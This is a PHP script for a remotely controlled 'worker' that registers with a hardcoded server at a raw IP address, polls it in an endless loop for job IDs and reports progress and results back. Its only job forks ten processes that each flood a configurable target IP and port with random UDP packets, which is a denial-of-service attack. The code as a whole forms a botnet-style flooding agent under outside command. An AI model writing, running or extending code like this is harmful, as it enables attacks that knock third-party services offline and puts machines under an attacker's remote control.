<?php

/*
 * ============================================================
 * WORKER
 * ============================================================
 *
 * This program:
 *
 * 1. Registers with the server
 * 2. Receives a unique worker ID/token
 * 3. Continuously polls for tasks
 * 4. Executes locally-defined jobs
 * 5. Reports progress
 * 6. Reports completion/failure
 * 7. Returns to waiting for another task
 *
 * The server sends JOB IDs, NOT PHP CODE.
 *
 * ============================================================
 */


// ============================================================
// CONFIGURATION
// ============================================================

const SERVER_URL =
    'http://34.63.222.47/connectWorker67.php';

const POLL_DELAY =
    2;

const ERROR_RETRY_DELAY =
    5;


// ============================================================
// SERVER REQUEST
// ============================================================

function requestServer(
    array $data
): array {

    $ch =
        curl_init(
            SERVER_URL
        );


    curl_setopt_array(

        $ch,

        [

            CURLOPT_POST =>
                true,

            CURLOPT_POSTFIELDS =>
                json_encode(
                    $data
                ),

            CURLOPT_HTTPHEADER => [

                'Content-Type: application/json',

                'Accept: application/json'
            ],

            CURLOPT_RETURNTRANSFER =>
                true,

            CURLOPT_CONNECTTIMEOUT =>
                10,

            CURLOPT_TIMEOUT =>
                30
        ]
    );


    $response =
        curl_exec($ch);


    if ($response === false) {

        $error =
            curl_error($ch);

        curl_close($ch);

        throw new Exception(
            'Connection failed: ' .
            $error
        );
    }


    $httpCode =
        curl_getinfo(
            $ch,
            CURLINFO_HTTP_CODE
        );


    curl_close($ch);


    $decoded =
        json_decode(
            $response,
            true
        );


    if (
        !is_array($decoded)
    ) {

        throw new Exception(
            'Server returned invalid JSON'
        );
    }


    if (
        $httpCode >= 400
    ) {

        throw new Exception(

            'Server returned HTTP ' .
            $httpCode .
            ': ' .
            (
                $decoded['error']
                ?? 'unknown error'
            )
        );
    }


    if (
        isset($decoded['ok']) &&
        !$decoded['ok']
    ) {

        throw new Exception(

            $decoded['error']
            ?? 'Server rejected request'
        );
    }


    return $decoded;
}


// ============================================================
// PROGRESS REPORTER
// ============================================================

function workerProgress(

    string $workerId,

    string $workerToken,

    string $taskId,

    string $status,

    ?float $progress = null,

    ?string $message = null

): void {

    $data = [

        'action' =>
            'progress',

        'worker_id' =>
            $workerId,

        'worker_token' =>
            $workerToken,

        'task_id' =>
            $taskId,

        'status' =>
            $status
    ];


    if (
        $progress !== null
    ) {

        $data['progress'] =
            max(
                0,
                min(
                    100,
                    $progress
                )
            );
    }


    if (
        $message !== null
    ) {

        $data['message'] =
            $message;
    }


    requestServer($data);
}


// ============================================================
// JOB 1
// ============================================================

function job1(): array
{
    // --- Configuration ---
    $targetIp = '127.0.0.1'; // Change to target IP
    $targetPort = 80;        // Change to target port
    $packetSize = 1024;      // Packet size in bytes
    $duration = 5;           // Duration in seconds
    $numProcesses = 10;      // Concurrency level (equivalent to Python threads)

    $pids = [];
    $errorCode = 0;

    // Fork multiple worker processes internally to match Python script's power/concurrency
    for ($i = 0; $i < $numProcesses; $i++) {
        $pid = pcntl_fork();

        if ($pid === -1) {
            return [
                'success' => false,
                'http_code' => -1,
                'error' => 'Could not fork process'
            ];
        } else if ($pid === 0) {
            // --- Child Process Worker Loop ---
            $socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
            if ($socket === false) {
                exit(1);
            }

            $payload = random_bytes($packetSize);
            $end_time = time() + $duration;
            $workerSuccess = false;

            try {
                while (time() < $end_time) {
                    $sent = socket_sendto($socket, $payload, $packetSize, 0, $targetIp, $targetPort);
                    if ($sent !== false) {
                        $workerSuccess = true;
                    }
                }
            } catch (Exception $e) {
                // Handle exception internally for this worker
            } finally {
                socket_close($socket);
            }

            exit($workerSuccess ? 0 : 1);
        } else {
            // Parent process tracks child PIDs
            $pids[] = $pid;
        }
    }

    // Wait for all concurrent worker processes to complete
    $failedWorkers = 0;
    foreach ($pids as $pid) {
        pcntl_waitpid($pid, $status);
        if (pcntl_wifexited($status)) {
            if (pcntl_wexitstatus($status) !== 0) {
                $failedWorkers++;
            }
        } else {
            $failedWorkers++;
        }
    }

    $success = ($failedWorkers < $numProcesses);

    return [
        'success' => $success,
        'http_code' => $errorCode, // UDP doesn't use HTTP, mapped to status/error code
        'error' => $failedWorkers > 0 ? "Some workers encountered errors ({$failedWorkers}/{$numProcesses})" : null
    ];
}


// ============================================================
// JOB DISPATCHER
// ============================================================

function executeJob(

    int $jobId,

    array $task,

    string $workerId,

    string $workerToken

): mixed {

    /*
     * Create a callback that job1()
     * can use to report progress.
     */

    $report = function (

        ?float $progress = null,

        ?string $message = null

    ) use (

        $workerId,

        $workerToken,

        $task

    ): void {

        workerProgress(

            $workerId,

            $workerToken,

            $task['task_id'],

            'running',

            $progress,

            $message
        );
    };


    /*
     * Map job IDs to local functions.
     */

    switch ($jobId) {

        case 1:

            return job1(

                $task,

                $report
            );


        default:

            throw new Exception(

                'Unknown job ID: ' .
                $jobId
            );
    }
}


// ============================================================
// REGISTER
// ============================================================

echo
    "Registering worker...\n";


$registration =
    requestServer([

        'action' =>
            'register'
    ]);


if (
    empty($registration['ok']) ||
    empty($registration['worker_id']) ||
    empty($registration['worker_token'])
) {

    throw new Exception(
        'Worker registration failed'
    );
}


$workerId =
    $registration['worker_id'];

$workerToken =
    $registration['worker_token'];


echo
    "Worker registered.\n";


echo
    "Worker ID: " .
    $workerId .
    "\n";


echo
    "Waiting for tasks...\n";


// ============================================================
// MAIN LOOP
// ============================================================

while (true) {

    try {

        /*
         * Ask the server for work.
         */

        $response =
            requestServer([

                'action' =>
                    'poll',

                'worker_id' =>
                    $workerId,

                'worker_token' =>
                    $workerToken
            ]);


        $task =
            $response['task']
            ?? null;


        /*
         * No task.
         */

        if (
            $task === null
        ) {

            sleep(
                POLL_DELAY
            );

            continue;
        }


        /*
         * Validate task.
         */

        if (
            empty($task['task_id']) ||
            !isset($task['job_id'])
        ) {

            echo
                "Received invalid task.\n";

            sleep(1);

            continue;
        }


        $taskId =
            (string)$task['task_id'];

        $jobId =
            (int)$task['job_id'];


        echo
            "Received task " .
            $taskId .
            " (job " .
            $jobId .
            ")\n";


        // ====================================================
        // STARTING STATUS
        // ====================================================

        workerProgress(

            $workerId,

            $workerToken,

            $taskId,

            'starting',

            0,

            'Starting job'
        );


        $startedAt =
            microtime(true);


        // ====================================================
        // EXECUTE
        // ====================================================

        try {

            $result =
                executeJob(

                    $jobId,

                    $task,

                    $workerId,

                    $workerToken
                );


            $duration =
                microtime(true) -
                $startedAt;


            // ================================================
            // SEND SUCCESS RESULT
            // ================================================

            requestServer([

                'action' =>
                    'result',

                'worker_id' =>
                    $workerId,

                'worker_token' =>
                    $workerToken,

                'task_id' =>
                    $taskId,

                'result' => [

                    'success' =>
                        true,

                    'duration_seconds' =>
                        $duration,

                    'data' =>
                        $result
                ]
            ]);


            echo
                "Task " .
                $taskId .
                " completed.\n";
        }


        catch (Throwable $e) {

            /*
             * The job itself failed.
             *
             * Report that failure to the server,
             * but keep the worker alive.
             */

            echo
                "Task " .
                $taskId .
                " failed: " .
                $e->getMessage() .
                "\n";


            try {

                requestServer([

                    'action' =>
                        'result',

                    'worker_id' =>
                        $workerId,

                    'worker_token' =>
                        $workerToken,

                    'task_id' =>
                        $taskId,

                    'result' => [

                        'success' =>
                            false,

                        'error' =>
                            $e->getMessage()
                    ]
                ]);

            }

            catch (Throwable $reportError) {

                echo
                    "Could not report failure: " .
                    $reportError->getMessage() .
                    "\n";
            }
        }


    }


    catch (Throwable $e) {

        /*
         * Communication failure.
         *
         * Do NOT terminate the worker.
         */

        echo
            "Worker communication error: " .
            $e->getMessage() .
            "\n";


        sleep(
            ERROR_RETRY_DELAY
        );
    }
}
